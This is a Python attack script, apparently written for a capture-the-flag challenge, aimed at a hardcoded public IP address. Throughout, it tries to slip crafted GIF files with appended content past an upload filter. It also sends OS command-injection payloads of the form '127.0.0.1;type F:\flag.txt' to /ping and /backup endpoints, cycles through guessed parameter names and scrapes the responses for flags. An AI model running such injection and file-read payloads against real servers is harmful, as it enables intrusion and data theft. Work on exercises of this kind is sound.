import requests
import re

requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
TIMEOUT = 15

session = requests.Session()
session.verify = False
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
})
session.proxies = {}


def print_section(title):
    print("\n" + "=" * 70)
    print(f"  {title}")
    print("=" * 70)


def test_gif_only_semicolon():
    """测试只包含GIF头部和;结尾的文件"""
    print_section("1. 测试最小GIF文件")
    
    url = f"{TARGET}/upload"
    
    r = session.get(url, timeout=TIMEOUT)
    csrf = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
    csrf_token = csrf.group(1) if csrf else ""
    
    # 最小有效GIF文件
    # GIF89a + 宽度(1字节) + 高度(1字节) + 标志字节 + 背景色索引 + 像素宽高比
    # + 全局颜色表(3字节 * 256 = 768字节，如果标志字节最高位为1)
    # + 图像块开始标记(,0x2c) + 图像位置 + 图像尺寸 + 局部标志 + 本地颜色表 + LZW最小码长 + 图像数据 + 块结束(0x00)
    # + GIF结束标记(;)
    
    # 创建一个有效的1x1像素GIF
    # 颜色表只有2种颜色
    gif_1x1 = b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x01\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4c\x01\x00;"
    
    print(f"  GIF文件长度: {len(gif_1x1)}")
    print(f"  以GIF89a开头: {gif_1x1.startswith(b'GIF89a')}")
    print(f"  以;结尾: {gif_1x1.endswith(b';')}")
    
    files = {"file": ("test_min.gif", gif_1x1, "image/gif")}
    r = session.post(url, files=files, data={"csrf": csrf_token}, timeout=TIMEOUT)
    
    if r.status_code == 200:
        if "上传成功" in r.text:
            uploaded_name = re.search(r'/uploads/([^"]+)', r.text)
            if uploaded_name:
                print(f"\n  🎉 最小GIF上传成功: /uploads/{uploaded_name.group(1)}")
                
                r2 = session.get(f"{TARGET}/uploads/{uploaded_name.group(1)}", timeout=TIMEOUT)
                print(f"     内容: {r2.content.hex()}")
        else:
            notice = re.search(r'<p class="notice">(.*?)</p>', r.text)
            if notice:
                print(f"\n  ❌ 最小GIF上传失败: {notice.group(1)}")


def test_gif_with_extra_content():
    """测试GIF文件中是否可以包含额外内容"""
    print_section("2. 测试GIF文件中包含额外内容")
    
    url = f"{TARGET}/upload"
    
    r = session.get(url, timeout=TIMEOUT)
    csrf = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
    csrf_token = csrf.group(1) if csrf else ""
    
    # 测试在;后面添加内容
    gif_with_extra_after = b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x01\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4c\x01\x00;extra content"
    
    print(f"  GIF文件长度: {len(gif_with_extra_after)}")
    
    files = {"file": ("test_extra.gif", gif_with_extra_after, "image/gif")}
    r = session.post(url, files=files, data={"csrf": csrf_token}, timeout=TIMEOUT)
    
    if r.status_code == 200:
        if "上传成功" in r.text:
            uploaded_name = re.search(r'/uploads/([^"]+)', r.text)
            if uploaded_name:
                print(f"\n  🎉 GIF+额外内容上传成功: /uploads/{uploaded_name.group(1)}")
        else:
            notice = re.search(r'<p class="notice">(.*?)</p>', r.text)
            if notice:
                print(f"\n  ❌ GIF+额外内容上传失败: {notice.group(1)}")
    
    # 测试在图像数据区域添加内容（在;之前）
    gif_with_extra_before = b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x01\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x4c\x01\x00some data;"
    
    files = {"file": ("test_extra2.gif", gif_with_extra_before, "image/gif")}
    r = session.post(url, files=files, data={"csrf": csrf_token}, timeout=TIMEOUT)
    
    if r.status_code == 200:
        if "上传成功" in r.text:
            uploaded_name = re.search(r'/uploads/([^"]+)', r.text)
            if uploaded_name:
                print(f"\n  🎉 GIF+图像数据区域内容上传成功: /uploads/{uploaded_name.group(1)}")
        else:
            notice = re.search(r'<p class="notice">(.*?)</p>', r.text)
            if notice:
                print(f"\n  ❌ GIF+图像数据区域内容上传失败: {notice.group(1)}")


def test_ping_raw():
    """直接测试Ping功能的命令执行"""
    print_section("3. 直接测试Ping命令执行")
    
    ping_url = f"{TARGET}/ping"
    
    # 尝试直接发送POST请求
    try:
        r = session.post(ping_url, data={"host": "127.0.0.1;type F:\\flag.txt"}, timeout=TIMEOUT)
        
        if r.status_code == 200:
            body_match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
            if body_match:
                body_content = body_match.group(1)
                
                print(f"\n  POST请求响应:")
                print(f"     内容: {body_content[:500]}")
                
                flag_match = re.search(r'flag\{[^}]+\}', body_content, re.IGNORECASE)
                if flag_match:
                    print(f"\n     🚩 FLAG FOUND: {flag_match.group(0)}")
                    return
                    
    except Exception as e:
        print(f"  POST错误: {e}")
    
    # 尝试不同的参数名
    param_names = ["host", "ip", "target", "address", "server", "node", "url", "query"]
    
    for param in param_names:
        try:
            r = session.get(ping_url, params={param: "127.0.0.1;type F:\\flag.txt"}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                body_match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
                if body_match:
                    body_content = body_match.group(1)
                    
                    if len(body_content) > 100:
                        print(f"\n  [{r.status_code}] ?{param}=127.0.0.1;type F:\\flag.txt")
                        print(f"     内容: {body_content[:500]}")
                        
                        flag_match = re.search(r'flag\{[^}]+\}', body_content, re.IGNORECASE)
                        if flag_match:
                            print(f"\n     🚩 FLAG FOUND: {flag_match.group(0)}")
                            return
                            
        except Exception as e:
            pass


def test_backup_raw():
    """直接测试Backup功能的命令执行"""
    print_section("4. 直接测试Backup命令执行")
    
    backup_url = f"{TARGET}/backup"
    
    # 尝试不同的参数名
    param_names = ["path", "dir", "directory", "folder", "file", "location", "target"]
    
    for param in param_names:
        try:
            r = session.get(backup_url, params={param: "F:\\small peoject\\python-lab\\uploads;type F:\\flag.txt"}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                body_match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
                if body_match:
                    body_content = body_match.group(1)
                    
                    if len(body_content) > 20:
                        print(f"\n  [{r.status_code}] ?{param}=F:\\small peoject\\python-lab\\uploads;type F:\\flag.txt")
                        print(f"     内容: {body_content[:500]}")
                        
                        flag_match = re.search(r'flag\{[^}]+\}', body_content, re.IGNORECASE)
                        if flag_match:
                            print(f"\n     🚩 FLAG FOUND: {flag_match.group(0)}")
                            return
                            
        except Exception as e:
            pass


def test_main_page():
    """测试主页面"""
    print_section("5. 测试主页面")
    
    url = f"{TARGET}/"
    
    r = session.get(url, timeout=TIMEOUT)
    
    print(f"\n  主页面内容:\n{r.text}")
    
    flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
    if flag_match:
        print(f"\n  🚩 FLAG FOUND: {flag_match.group(0)}")


def main():
    print("*" * 70)
    print("  CTF漏洞深度测试")
    print("  目标: " + TARGET)
    print("*" * 70)
    
    test_gif_only_semicolon()
    test_gif_with_extra_content()
    test_ping_raw()
    test_backup_raw()
    test_main_page()
    
    print_section("测试完成")


if __name__ == "__main__":
    main()